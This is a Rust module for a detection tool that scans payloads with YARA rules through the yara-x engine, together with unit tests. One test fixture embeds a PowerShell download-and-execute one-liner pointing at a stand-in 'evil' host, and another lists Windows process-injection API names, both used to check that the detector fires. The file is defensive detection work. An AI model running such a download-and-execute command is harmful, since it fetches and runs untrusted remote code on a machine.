// Copyright (c) 2026 Allen Mack. All Rights Reserved.
// Proprietary software - see NOTICE at the repository root.
//! detection::yara — YARA rule scanning via the pure-Rust `yara-x` engine.
//!
//! This is the integration point the architecture intentionally deferred:
//! `yara-x` needs no `libyara` C dependency, so the pure-Rust build is
//! preserved. [`YaraScanner`] compiles rules from source and matches them
//! against payloads; matches flow into the threat engine's scoring.
//!
//! Honest limits: the bundled [`DEFAULT_RULES`] are a handful of heuristic
//! starter rules, not a maintained threat feed. Expect false positives on
//! legitimate admin tooling. Every match is a triage signal, not a
//! conviction — the engine scores it, it does not auto-convict on it.

use serde::{Deserialize, Serialize};

/// Bundled starter ruleset. Replace with curated rules for production.
pub const DEFAULT_RULES: &str = include_str!("rules/default.yar");

/// A single YARA rule match.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct YaraMatch {
    /// Rule identifier, e.g. `possible_process_injection`.
    pub rule: String,
    /// Namespace the rule was compiled under (empty for the default compile).
    pub namespace: String,
    /// Rule tags, if any.
    pub tags: Vec<String>,
    /// Human-readable summary from the rule's `description` metadata.
    pub description: String,
    /// Threat-score contribution from the rule's `score` metadata (0-100).
    /// Defaults to 40 when the rule does not declare one.
    pub score: u32,
}

/// YARA compilation or scan failure. Rules that fail to compile are a
/// configuration error, surfaced here rather than silently ignored.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct YaraError(pub String);

impl std::fmt::Display for YaraError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "yara error: {}", self.0)
    }
}

impl std::error::Error for YaraError {}

/// Compiled YARA ruleset. Create per scan; the compiled [`yara_x::Rules`]
/// are reused across calls.
pub struct YaraScanner {
    rules: yara_x::Rules,
}

impl YaraScanner {
    /// Compiles a ruleset from YARA source text.
    pub fn compile(source: &str) -> Result<Self, YaraError> {
        let rules = yara_x::compile(source)
            .map_err(|e| YaraError(format!("rule compilation failed: {e}")))?;
        Ok(Self { rules })
    }

    /// Compiles the bundled starter ruleset.
    pub fn with_default_rules() -> Result<Self, YaraError> {
        Self::compile(DEFAULT_RULES)
    }

    /// Number of rules in the compiled ruleset.
    pub fn rule_count(&self) -> usize {
        self.rules.iter().count()
    }

    /// Scans `data`, returning one [`YaraMatch`] per matching rule.
    pub fn scan(&self, data: &[u8]) -> Result<Vec<YaraMatch>, YaraError> {
        let mut scanner = yara_x::Scanner::new(&self.rules);
        let results = scanner
            .scan(data)
            .map_err(|e| YaraError(format!("scan failed: {e}")))?;

        let mut matches = Vec::new();
        for rule in results.matching_rules() {
            let mut description = String::new();
            let mut score: u32 = 40;
            for (name, value) in rule.metadata() {
                match name {
                    "description" => {
                        if let yara_x::MetaValue::String(s) = value {
                            description = s.to_string();
                        }
                    }
                    "score" => {
                        if let yara_x::MetaValue::Integer(n) = value {
                            score = n.clamp(0, 100) as u32;
                        }
                    }
                    _ => {}
                }
            }
            matches.push(YaraMatch {
                rule: rule.identifier().to_string(),
                namespace: rule.namespace().to_string(),
                tags: rule.tags().map(|t| t.identifier().to_string()).collect(),
                description,
                score,
            });
        }
        Ok(matches)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_rules_compile() {
        let scanner = YaraScanner::with_default_rules().expect("default rules must compile");
        assert_eq!(scanner.rule_count(), 4);
    }

    #[test]
    fn bad_rules_are_an_error_not_silent() {
        match YaraScanner::compile("rule broken { condition: ") {
            Err(YaraError(_)) => {}
            Ok(_) => panic!("invalid rules must not compile"),
        }
    }

    fn pe_with_dropper_strings() -> Vec<u8> {
        let mut v = b"MZ".to_vec();
        v.extend_from_slice(&[0u8; 62]);
        v.extend_from_slice(
            b"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil/x')",
        );
        v
    }

    #[test]
    fn dropper_payload_matches_expected_rule() {
        let scanner = YaraScanner::with_default_rules().unwrap();
        let matches = scanner.scan(&pe_with_dropper_strings()).unwrap();
        assert!(
            matches
                .iter()
                .any(|m| m.rule == "pe_with_powershell_download"),
            "expected pe_with_powershell_download, got: {matches:?}"
        );
        let m = matches
            .iter()
            .find(|m| m.rule == "pe_with_powershell_download")
            .unwrap();
        assert_eq!(m.score, 55);
        assert!(!m.description.is_empty());
    }

    #[test]
    fn injection_apis_match_injection_rule() {
        let scanner = YaraScanner::with_default_rules().unwrap();
        let mut v = b"MZ".to_vec();
        v.extend_from_slice(b"\x00CreateRemoteThread\x00VirtualAllocEx\x00WriteProcessMemory\x00");
        let matches = scanner.scan(&v).unwrap();
        assert!(
            matches
                .iter()
                .any(|m| m.rule == "possible_process_injection"),
            "got: {matches:?}"
        );
    }

    #[test]
    fn benign_text_does_not_match() {
        let scanner = YaraScanner::with_default_rules().unwrap();
        let matches = scanner
            .scan(
                b"Hello, this is a quarterly report about quarterly earnings. Nothing to see here.",
            )
            .unwrap();
        assert!(
            matches.is_empty(),
            "false positive on benign text: {matches:?}"
        );
    }

    #[test]
    fn custom_ruleset_works() {
        let scanner = YaraScanner::compile(
            r#"rule always { meta: description = "test" score = 10 strings: $a = "needle" condition: $a }"#,
        )
        .unwrap();
        assert_eq!(scanner.rule_count(), 1);
        let hits = scanner.scan(b"find the needle here").unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].rule, "always");
        assert_eq!(hits[0].score, 10);
        assert!(scanner.scan(b"no match here").unwrap().is_empty());
    }
}
